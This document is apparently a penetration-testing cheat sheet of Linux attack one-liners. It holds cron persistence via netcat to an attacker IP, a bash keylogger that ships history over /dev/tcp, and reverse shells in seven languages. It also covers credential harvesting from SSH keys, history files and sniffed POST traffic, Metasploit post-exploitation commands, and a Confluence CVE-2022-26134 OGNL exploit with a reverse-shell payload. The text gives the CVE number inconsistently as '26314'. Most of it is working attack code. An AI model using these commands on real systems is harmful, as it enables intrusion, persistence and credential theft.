# Linux TTPs:

## One Liner to Add Persistence on a Box via Cron:

```
echo "* * * * * /bin/nc <attacker IP> 1234 -e /bin/bash" > cron && crontab cron
```

On the attack platform: ```nc -lvp 1234```

## Search for Hardcoded Passwords:

```
grep -irE '(password|pwd|pass)[[:space:]]*=[[:space:]]*[[:alpha:]]+' *
```

The regex is a POSIX ERE expression that matches

- (password|pwd|pass) - either password or pwd or pass
- [[:space:]]*=[[:space:]]* - a = enclosed with 0 or more whitespaces
- [[:alpha:]]+ - 1 or more letters.

To output matches, add -o option to grep

## Nmap Scan Every Interface that is Assigned an IP:

```
ifconfig -a | grep -Po '\b(?!255)(?:\d{1,3}\.){3}(?!255)\d{1,3}\b' | xargs nmap -A -p0-
```

## Apache Flink Directory Traversal 

```
cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent
```

## Bash Keylogger:

```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```

## Recon for Specific Device Before Enumerating:

```
sudo tcpdump 'ether host XX:XX:XX:XX:XX:XX' -i en0 -vnt > CheckScan.txt |  tee CheckScan.txt | grep --line-buffered pattern | ( while read -r line; do sudo nmap -sV -n -T4 -O2 -oX NMAPScan.xml; rm CheckScan.txt; done; ) &
```
## Extract Passwords from HTTP POST Requests:

```
sudo tcpdump -s 0 -A -n -l | egrep -i "POST /|pwd=|passwd=|password=|Host:"
```
## BPF'ing DNS Records:

```
# All queries
tcpdump -nt 'dst port 53 and udp[10] & 0x80 = 0'

# All responses
tcpdump -nt 'src port 53 and udp[10] & 0x80 = 0x80'
```

## Important Files:

```
/boot/vmlinuz : The Linux Kernel file.
/dev/had : Device file for the first IDE HDD (Hard Disk Drive) /dev/hdc : Device file for the IDE Cdrom, commonly
/dev/null : A pseudo device
/etc/bashrc : System defaults and aliases used by bash shell. /etc/crontab : Cron run commands on a predefined time Interval. /etc/exports : Information of the file system available on network. /etc/fstab : Information of Disk Drive and their mount point. /etc/group : Information of Security Group.
/etc/grub.conf : grub bootloader configuration file.
/etc/init.d : Service startup Script.
/etc/lilo.conf : lilo bootloader configuration file.
/etc/hosts : Information on IP's and corresponding hostnames. /etc/hosts.allow : Hosts allowed access to services on local host. /etc/host.deny : Hosts denied access to services on local host. /etc/inittab : INIT process and interactions at various run level. /etc/issue : Allows to edit the pre-login message. /etc/modules.conf : Configuration files for system modules. /etc/motd : Message Of The Day
/etc/mtab : Currently mounted blocks information.
/etc/passwd : System users with password hash redacted. /etc/printcap : Printer Information
/etc/profile : Bash shell defaults
/etc/profile.d : Application script, executed after login. /etc/rc.d : Information about run level specific script. /etc/rc.d/init.d : Run Level Initialisation Script. /etc/resolv.conf : Domain Name Servers (DNS) being used by System. /etc/securetty : Terminal List, where root login is possible. /etc/shadow : System users with password hash.
/etc/skel : Script that populates new user home directory. /etc/termcap : ASCII file defines the behavior of Terminal. /etc/X11 : Configuration files of X-window System.
/usr/bin : Normal user executable commands.
/usr/bin/X11 : Binaries of X windows System.
/usr/include : Contains include files used by ‘c‘ program. /usr/share : Shared directories of man files, info files, etc. /usr/lib : Library files required during program compilation. /usr/sbin : Commands for Super User, for System Administration. /proc/cpuinfo : CPU Information
/proc/filesystems : File-system information being used currently. /proc/interrupts : Information about the current interrupts. /proc/ioports : All Input/Output addresses used by devices. /proc/meminfo : Memory Usages Information.
/proc/modules : Currently used kernel module.
/proc/mount : Mounted File-system Information.
/proc/stat : Detailed Statistics of the current System. /proc/swaps : Swap File Information.
/version : Linux Version Information.
/var/log/auth* : Log of authorization login attempts. /var/log/lastlog : Log of last boot process.
```

# Reverse Shells:

## Bash:

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## PERL:

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP:

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Ruby:

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat:

```
nc -e /bin/sh 10.0.0.1 1234
```

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

## Java:

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

# Password Harvesting:

Passwords can be found in many places

```
# Process lists

user@victim $ ps -efw

# Usernames entered into login prompt by mistake

user@victim $ last -f /var/log/bmtp

# Usernames entered into command line arguments

user@victim $ cat /home/*/.*history

# Passwords saved in web files

user@victim $ grep -iR password /var/www

# SSH keys

user@victim $ cat /home/*/.ssh/id*
```

## Unusual Accounts:

Look in /etc/passwd for new accounts in a sorted list:

```
user@RoseSecurity $ sort -nk3 -t: /etc/passwd | less
```

Look for users with a UID of 0:

```
user@RoseSecurity $ grep :0: /etc/passwd
```

# Routers:

Resources:

```
 https://www.routerpasswords.com
```
# Metasploit Callback Automation:

Use AutoRunScript to run commands on a reverse shell callback

```
set AutoRunScript multi_console_command -rc /root/commands.rc
```

`/root/commands.rc` contains the commands you wish to run

Example:

```
run post/windows/manage/migrate
run post/windows/manage/killfw
run post/windows/gather/checkvm
```
## Metasploit Session Management:

List all sessions

```
msf6> sessions
```
Execute command across all sessions

```
msf6> sessions -C <command>
```

Kill all sessions

```
msf6> sessions -K
```

Upgrade a shell to a meterpreter session on many platforms

```
msf6> sessions -u
```

## Metasploit Tips I Discovered Too Late:

In order to save a lot of typing during a pentest, you can set global variables within msfconsole. You can do this with the setg command. Once these have been set, you can use them in as many exploits and auxiliary modules as you like. You can also save them for use the next time you start msfconsole. However, the pitfall is forgetting you have saved globals, so always check your options before you run or exploit. Conversely, you can use the unsetg command to unset a global variable. In the examples that follow, variables are entered in all-caps (ie: LHOST), but Metasploit is case-insensitive so it is not necessary to do so.

```
msf > setg LHOST 192.168.1.101
LHOST => 192.168.1.101
msf > setg RHOSTS 192.168.1.0/24
RHOSTS => 192.168.1.0/24
msf > setg RHOST 192.168.1.136
RHOST => 192.168.1.136
```

# Confluence CVE-2022-26134:

CVE-2022-26314 is an unauthenticated and remote OGNL injection vulnerability resulting in code execution in the context of the Confluence server (typically the confluence user on Linux installations). Given the nature of the vulnerability, internet-facing Confluence servers are at very high risk.

As stated, the vulnerability is an OGNL injection vulnerability affecting the HTTP server. The OGNL payload is placed in the URI of an HTTP request. Any type of HTTP method appears to work, whether valid (GET, POST, PUT, etc) or invalid (e.g. “BALH”). In its simplest form, an exploit abusing the vulnerability looks like this:

```
curl -v http://10.0.0.28:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/r7%22%29%7D/
```

Above, the exploit is URL-encoded. The exploit encompasses everything from the start of the content location to the last instance of /. Decoded it looks like this:

```
${@java.lang.Runtime@getRuntime().exec("touch /tmp/r7")}
```

Reverse Shell:

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

Decoded:

```
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}
```

 
